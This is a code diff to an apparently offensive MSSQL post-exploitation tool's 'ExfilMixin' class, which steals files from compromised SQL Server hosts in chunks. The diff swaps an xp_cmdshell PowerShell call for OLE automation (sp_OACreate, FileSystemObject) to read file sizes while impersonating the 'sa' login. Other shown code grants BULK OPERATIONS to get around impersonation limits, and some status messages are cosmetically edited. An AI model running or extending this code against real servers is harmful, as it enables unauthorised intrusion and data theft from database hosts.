@@ -14,7 +14,12 @@ class ExfilMixin:
     def _get_remote_file_size(self, shell, remote_path: str) -> int | None:
         size_out = self._exec_q(shell,
             "EXECUTE AS LOGIN='sa';"
-            f"EXEC xp_cmdshell 'powershell -Command (Get-Item {self._tsql_escape(remote_path)}).Length'"
+            "DECLARE @fso INT,@f INT,@sz BIGINT;"
+            "EXEC sp_OACreate 'Scripting.FileSystemObject',@fso OUT;"
+            f"EXEC sp_OAMethod @fso,'GetFile',@f OUT,'{self._tsql_escape(remote_path)}';"
+            "EXEC sp_OAGetProperty @f,'Size',@sz OUT;"
+            "SELECT @sz AS file_size;"
+            "EXEC sp_OADestroy @fso;"
         )
         for line in (size_out or "").splitlines():
             s = line.strip()
@@ -37,7 +42,7 @@ class ExfilMixin:
             return
 
         num_chunks = math.ceil(file_size / chunk_bytes)
-        print(f"[*] xpexfil: {file_size} bytes → {num_chunks} chunk(s) of {chunk_mb} MB each")
+        print(f"[*] xpexfil: {file_size} bytes, {num_chunks} chunk(s) of {chunk_mb} MB each")
 
         for i in range(num_chunks):
             offset = i * chunk_bytes
@@ -95,7 +100,7 @@ class ExfilMixin:
                             break
                         out_f.write(buf)
                 os.remove(cp)
-        print(f"[+] xpexfil done → {out_path}")
+        print(f"[+] xpexfil done: {out_path}")
 
     def _build_exfil_insert_ps(self, remote_path: str, key_b64: str,
                                offset: int = 0, length: int = None) -> str:
@@ -244,7 +249,7 @@ class ExfilMixin:
                     hex_text = hf.read()
                 out_f.write(bytes.fromhex(hex_text))
                 os.remove(hex_path)
-        print(f"[+] xpexfil-hex done \u2192 {out_path}")
+        print(f"[+] xpexfil-hex done: {out_path}")
 
     def cmd_xpexfil_hex(self, shell, remote_path: str, local_name: str,
                         insert_timeout_s: int = 600, chunk_mb: int = 10):
@@ -256,7 +261,7 @@ class ExfilMixin:
             print("[!] xpexfil-hex: could not read file size")
             return
         num_chunks = math.ceil(file_size / (chunk_mb * 1024 * 1024))
-        print(f"[*] xpexfil-hex: {file_size} bytes \u2192 {num_chunks} chunk(s)")
+        print(f"[*] xpexfil-hex: {file_size} bytes, {num_chunks} chunk(s)")
 
         # B \u2014 grant BULK OPERATIONS (OPENROWSET ignores EXECUTE AS impersonation)
         self._exec_q(shell,
